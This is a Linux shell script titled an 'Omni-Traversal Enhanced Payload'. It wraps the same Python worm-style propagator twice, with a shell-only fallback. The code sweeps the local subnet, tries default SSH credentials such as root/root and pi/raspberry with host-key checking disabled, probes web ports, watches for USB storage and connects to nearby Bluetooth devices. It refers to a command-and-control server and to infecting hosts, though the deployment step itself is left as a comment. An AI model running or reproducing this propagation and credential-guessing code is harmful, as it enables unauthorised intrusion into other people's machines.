#!/bin/sh
# Omni-Traversal Enhanced Payload
# ID: 540876a1-f591-4d5c-ad44-5f7d930066a8
# Platform: linux

echo "[*] Omni Propagation System Initializing..."
echo "[*] Payload ID: 540876a1-f591-4d5c-ad44-5f7d930066a8"
echo "[*] Platform: linux"

# Detect environment and adapt
if command -v python3 >/dev/null 2>&1; then
    echo "[+] Python3 detected - executing enhanced payload"
    exec python3 -c "import os, sys, platform, subprocess, threading, time, socket, re

class OmniPropagator:
    def __init__(self):
        self.id = \"540876a1-f591-4d5c-ad44-5f7d930066a8\"
        self.platform = platform.system().lower()
        self.c2_server = \"http://localhost:8080\"
        
    def propagate(self):
        \"\"\"Main propagation loop\"\"\"
        print(f\"[*] Starting Omni Propagation v2.0\")
        print(f\"[*] ID: {self.id}\")
        print(f\"[*] Platform: {self.platform}\")
        
        # Start propagation threads
        threads = []
        
        # 1. Network propagation
        threads.append(threading.Thread(target=self.propagate_network))
        
        # 2. USB monitoring (Linux only)
        if self.platform == \"linux\":
            threads.append(threading.Thread(target=self.monitor_usb))
        
        # 3. Bluetooth scanning (if available)
        threads.append(threading.Thread(target=self.scan_bluetooth))
        
        # Start all threads
        for t in threads:
            t.daemon = True
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print(\"[*] Propagation stopped\")
    
    def propagate_network(self):
        \"\"\"Real network scanning\"\"\"
        print(\"[*] Starting network propagation...\")
        
        # Get local network
        network = self.get_local_network()
        print(f\"[*] Local network: {network}\")
        
        # Scan for live hosts
        live_hosts = self.scan_network_range(network)
        print(f\"[*] Found {len(live_hosts)} live hosts\")
        
        # Try to propagate to each host
        for host in live_hosts:
            if host != self.get_local_ip():
                self.try_infect_host(host)
    
    def get_local_network(self):
        \"\"\"Get local network range\"\"\"
        try:
            # Simple method - assume /24 network
            result = subprocess.run([\"hostname\", \"-I\"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                ip = result.stdout.strip().split()[0]
                parts = ip.split('"'"'.'"'"')
                return f\"{parts[0]}.{parts[1]}.{parts[2]}.0/24\"
        except:
            pass
        return \"192.168.1.0/24\"  # Default
    
    def get_local_ip(self):
        \"\"\"Get local IP address\"\"\"
        try:
            result = subprocess.run([\"hostname\", \"-I\"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return result.stdout.strip().split()[0]
        except:
            pass
        return \"unknown\"
    
    def scan_network_range(self, network):
        \"\"\"Scan a network range for live hosts\"\"\"
        live_hosts = []
        
        try:
            # Extract base IP (e.g., 192.168.1 from 192.168.1.0/24)
            base_ip = network.split('"'"'/'"'"')[0]
            base_parts = base_ip.split('"'"'.'"'"')
            base_network = f\"{base_parts[0]}.{base_parts[1]}.{base_parts[2]}.\"
            
            # Scan first 20 hosts (for speed)
            print(\"[*] Scanning network range...\")
            for i in range(1, 21):
                ip = f\"{base_network}{i}\"
                if self.ping_host(ip):
                    live_hosts.append(ip)
                    print(f\"[+] Host alive: {ip}\")
        
        except Exception as e:
            print(f\"[-] Scan error: {e}\")
        
        return live_hosts
    
    def ping_host(self, ip):
        \"\"\"Ping a host to check if alive\"\"\"
        try:
            # Platform-specific ping
            if self.platform == \"linux\":
                cmd = f\"ping -c 1 -W 1 {ip}\"
            else:  # windows
                cmd = f\"ping -n 1 {ip}\"
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def try_infect_host(self, host):
        \"\"\"Try to infect a remote host\"\"\"
        print(f\"[*] Attempting infection of {host}\")
        
        # Try multiple methods
        methods = [
            (\"ping\", lambda h: self.ping_host(h)),  # Just verify host is up
            (\"ssh_test\", self.test_ssh),
            (\"http_test\", self.test_http),
        ]
        
        for method_name, method_func in methods:
            try:
                if method_func(host):
                    print(f\"[+] {host} is vulnerable to {method_name}\")
                    # In real scenario, would deploy payload here
                    break
            except Exception as e:
                print(f\"[-] {method_name} failed on {host}: {e}\")
    
    def test_ssh(self, host):
        \"\"\"Test if SSH is accessible with common credentials\"\"\"
        # Common credentials to try
        credentials = [
            (\"root\", \"root\"),
            (\"admin\", \"admin\"),
            (\"ubuntu\", \"ubuntu\"),
            (\"pi\", \"raspberry\"),
        ]
        
        for user, password in credentials:
            try:
                # Using sshpass for testing
                cmd = f\"sshpass -p "SSH_PASSWORD_PLACEHOLDER"'"'{password}'"'"' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{host} '"'"'echo test'"'"' 2>/dev/null\"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def test_http(self, host):
        \"\"\"Test if HTTP services are accessible\"\"\"
        ports = [80, 443, 8080, 8443]
        
        for port in ports:
            try:
                cmd = f\"curl -s --connect-timeout 3 http://{host}:{port} 2>/dev/null\"
                result = subprocess.run(cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def monitor_usb(self):
        \"\"\"Monitor for USB device insertion (Linux)\"\"\"
        print(\"[*] Starting USB device monitoring...\")
        
        last_check = time.time()
        checked_devices = set()
        
        while True:
            try:
                # List USB devices
                result = subprocess.run([\"lsusb\"], capture_output=True, text=True)
                
                for line in result.stdout.split('"'"'\n'"'"'):
                    if line and \"ID\" in line:
                        device_id = line.split()[5]  # Get USB ID
                        
                        if device_id not in checked_devices:
                            print(f\"[+] New USB device detected: {line}\")
                            checked_devices.add(device_id)
                            
                            # Check if it'"'"'s a storage device
                            if self.is_usb_storage(device_id):
                                print(f\"[+] USB storage device found - would infect in real scenario\")
                
                # Check mounted drives
                result = subprocess.run([\"df\", \"-h\"], capture_output=True, text=True)
                for line in result.stdout.split('"'"'\n'"'"'):
                    if \"/media/\" in line or \"/mnt/\" in line:
                        print(f\"[+] Mounted drive: {line}\")
            
            except Exception as e:
                print(f\"[-] USB monitor error: {e}\")
            
            time.sleep(10)  # Check every 10 seconds
    
    def is_usb_storage(self, usb_id):
        \"\"\"Check if USB device is a storage device\"\"\"
        try:
            # Check USB device class
            cmd = f\"udevadm info -a -n /dev/bus/usb/{usb_id.replace('"'"':'"'"', '"'"'/'"'"')} 2>/dev/null | grep -i '"'"'storage'"'"'\"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return \"storage\" in result.stdout.lower()
        except:
            return False
    
    def scan_bluetooth(self):
        \"\"\"Scan for Bluetooth devices\"\"\"
        print(\"[*] Starting Bluetooth scan...\")
        
        if not self.has_bluetooth():
            print(\"[-] Bluetooth not available\")
            return
        
        try:
            # Start Bluetooth scan
            cmd = \"bluetoothctl -- scan on 2>&1\"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            # Parse devices
            devices = re.findall(r'"'"'Device ([0-9A-F:]+) (.+)'"'"', result.stdout)
            for mac, name in devices:
                print(f\"[+] Bluetooth device: {name} ({mac})\")
                
                # Try to connect (in real scenario would pair and infect)
                if self.platform == \"linux\":
                    try:
                        connect_cmd = f\"bluetoothctl -- connect {mac} 2>&1\"
                        subprocess.run(connect_cmd, shell=True, capture_output=True, timeout=5)
                    except:
                        pass
        
        except Exception as e:
            print(f\"[-] Bluetooth scan error: {e}\")
    
    def has_bluetooth(self):
        \"\"\"Check if Bluetooth is available\"\"\"
        try:
            result = subprocess.run([\"which\", \"bluetoothctl\"], capture_output=True)
            return result.returncode == 0
        except:
            return False

# Start propagation
if __name__ == \"__main__\":
    propagator = OmniPropagator()
    propagator.propagate()
"
elif command -v python >/dev/null 2>&1; then
    echo "[+] Python detected - executing enhanced payload"
    exec python -c "import os, sys, platform, subprocess, threading, time, socket, re

class OmniPropagator:
    def __init__(self):
        self.id = \"540876a1-f591-4d5c-ad44-5f7d930066a8\"
        self.platform = platform.system().lower()
        self.c2_server = \"http://localhost:8080\"
        
    def propagate(self):
        \"\"\"Main propagation loop\"\"\"
        print(f\"[*] Starting Omni Propagation v2.0\")
        print(f\"[*] ID: {self.id}\")
        print(f\"[*] Platform: {self.platform}\")
        
        # Start propagation threads
        threads = []
        
        # 1. Network propagation
        threads.append(threading.Thread(target=self.propagate_network))
        
        # 2. USB monitoring (Linux only)
        if self.platform == \"linux\":
            threads.append(threading.Thread(target=self.monitor_usb))
        
        # 3. Bluetooth scanning (if available)
        threads.append(threading.Thread(target=self.scan_bluetooth))
        
        # Start all threads
        for t in threads:
            t.daemon = True
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print(\"[*] Propagation stopped\")
    
    def propagate_network(self):
        \"\"\"Real network scanning\"\"\"
        print(\"[*] Starting network propagation...\")
        
        # Get local network
        network = self.get_local_network()
        print(f\"[*] Local network: {network}\")
        
        # Scan for live hosts
        live_hosts = self.scan_network_range(network)
        print(f\"[*] Found {len(live_hosts)} live hosts\")
        
        # Try to propagate to each host
        for host in live_hosts:
            if host != self.get_local_ip():
                self.try_infect_host(host)
    
    def get_local_network(self):
        \"\"\"Get local network range\"\"\"
        try:
            # Simple method - assume /24 network
            result = subprocess.run([\"hostname\", \"-I\"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                ip = result.stdout.strip().split()[0]
                parts = ip.split('"'"'.'"'"')
                return f\"{parts[0]}.{parts[1]}.{parts[2]}.0/24\"
        except:
            pass
        return \"192.168.1.0/24\"  # Default
    
    def get_local_ip(self):
        \"\"\"Get local IP address\"\"\"
        try:
            result = subprocess.run([\"hostname\", \"-I\"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return result.stdout.strip().split()[0]
        except:
            pass
        return \"unknown\"
    
    def scan_network_range(self, network):
        \"\"\"Scan a network range for live hosts\"\"\"
        live_hosts = []
        
        try:
            # Extract base IP (e.g., 192.168.1 from 192.168.1.0/24)
            base_ip = network.split('"'"'/'"'"')[0]
            base_parts = base_ip.split('"'"'.'"'"')
            base_network = f\"{base_parts[0]}.{base_parts[1]}.{base_parts[2]}.\"
            
            # Scan first 20 hosts (for speed)
            print(\"[*] Scanning network range...\")
            for i in range(1, 21):
                ip = f\"{base_network}{i}\"
                if self.ping_host(ip):
                    live_hosts.append(ip)
                    print(f\"[+] Host alive: {ip}\")
        
        except Exception as e:
            print(f\"[-] Scan error: {e}\")
        
        return live_hosts
    
    def ping_host(self, ip):
        \"\"\"Ping a host to check if alive\"\"\"
        try:
            # Platform-specific ping
            if self.platform == \"linux\":
                cmd = f\"ping -c 1 -W 1 {ip}\"
            else:  # windows
                cmd = f\"ping -n 1 {ip}\"
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def try_infect_host(self, host):
        \"\"\"Try to infect a remote host\"\"\"
        print(f\"[*] Attempting infection of {host}\")
        
        # Try multiple methods
        methods = [
            (\"ping\", lambda h: self.ping_host(h)),  # Just verify host is up
            (\"ssh_test\", self.test_ssh),
            (\"http_test\", self.test_http),
        ]
        
        for method_name, method_func in methods:
            try:
                if method_func(host):
                    print(f\"[+] {host} is vulnerable to {method_name}\")
                    # In real scenario, would deploy payload here
                    break
            except Exception as e:
                print(f\"[-] {method_name} failed on {host}: {e}\")
    
    def test_ssh(self, host):
        \"\"\"Test if SSH is accessible with common credentials\"\"\"
        # Common credentials to try
        credentials = [
            (\"root\", \"root\"),
            (\"admin\", \"admin\"),
            (\"ubuntu\", \"ubuntu\"),
            (\"pi\", \"raspberry\"),
        ]
        
        for user, password in credentials:
            try:
                # Using sshpass for testing
                cmd = f\"sshpass -p "SSH_PASSWORD_PLACEHOLDER"'"'{password}'"'"' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{host} '"'"'echo test'"'"' 2>/dev/null\"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def test_http(self, host):
        \"\"\"Test if HTTP services are accessible\"\"\"
        ports = [80, 443, 8080, 8443]
        
        for port in ports:
            try:
                cmd = f\"curl -s --connect-timeout 3 http://{host}:{port} 2>/dev/null\"
                result = subprocess.run(cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def monitor_usb(self):
        \"\"\"Monitor for USB device insertion (Linux)\"\"\"
        print(\"[*] Starting USB device monitoring...\")
        
        last_check = time.time()
        checked_devices = set()
        
        while True:
            try:
                # List USB devices
                result = subprocess.run([\"lsusb\"], capture_output=True, text=True)
                
                for line in result.stdout.split('"'"'\n'"'"'):
                    if line and \"ID\" in line:
                        device_id = line.split()[5]  # Get USB ID
                        
                        if device_id not in checked_devices:
                            print(f\"[+] New USB device detected: {line}\")
                            checked_devices.add(device_id)
                            
                            # Check if it'"'"'s a storage device
                            if self.is_usb_storage(device_id):
                                print(f\"[+] USB storage device found - would infect in real scenario\")
                
                # Check mounted drives
                result = subprocess.run([\"df\", \"-h\"], capture_output=True, text=True)
                for line in result.stdout.split('"'"'\n'"'"'):
                    if \"/media/\" in line or \"/mnt/\" in line:
                        print(f\"[+] Mounted drive: {line}\")
            
            except Exception as e:
                print(f\"[-] USB monitor error: {e}\")
            
            time.sleep(10)  # Check every 10 seconds
    
    def is_usb_storage(self, usb_id):
        \"\"\"Check if USB device is a storage device\"\"\"
        try:
            # Check USB device class
            cmd = f\"udevadm info -a -n /dev/bus/usb/{usb_id.replace('"'"':'"'"', '"'"'/'"'"')} 2>/dev/null | grep -i '"'"'storage'"'"'\"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return \"storage\" in result.stdout.lower()
        except:
            return False
    
    def scan_bluetooth(self):
        \"\"\"Scan for Bluetooth devices\"\"\"
        print(\"[*] Starting Bluetooth scan...\")
        
        if not self.has_bluetooth():
            print(\"[-] Bluetooth not available\")
            return
        
        try:
            # Start Bluetooth scan
            cmd = \"bluetoothctl -- scan on 2>&1\"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            # Parse devices
            devices = re.findall(r'"'"'Device ([0-9A-F:]+) (.+)'"'"', result.stdout)
            for mac, name in devices:
                print(f\"[+] Bluetooth device: {name} ({mac})\")
                
                # Try to connect (in real scenario would pair and infect)
                if self.platform == \"linux\":
                    try:
                        connect_cmd = f\"bluetoothctl -- connect {mac} 2>&1\"
                        subprocess.run(connect_cmd, shell=True, capture_output=True, timeout=5)
                    except:
                        pass
        
        except Exception as e:
            print(f\"[-] Bluetooth scan error: {e}\")
    
    def has_bluetooth(self):
        \"\"\"Check if Bluetooth is available\"\"\"
        try:
            result = subprocess.run([\"which\", \"bluetoothctl\"], capture_output=True)
            return result.returncode == 0
        except:
            return False

# Start propagation
if __name__ == \"__main__\":
    propagator = OmniPropagator()
    propagator.propagate()
"
else
    echo "[+] Shell-only mode"
    echo "[*] Shell-only propagation mode"

# Network scan
echo "[*] Scanning local network (1-20)..."
for i in {1..20}; do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo "[+] Host alive: 192.168.1.$i" &
done
wait

# USB devices
echo "[*] Checking USB devices..."
lsusb 2>/dev/null | head -10

# Bluetooth (if available)
echo "[*] Checking Bluetooth..."
if command -v bluetoothctl >/dev/null 2>&1; then
    timeout 5 bluetoothctl -- scan on 2>&1 | grep -i device | head -5
fi

echo "[*] Shell propagation complete"

fi
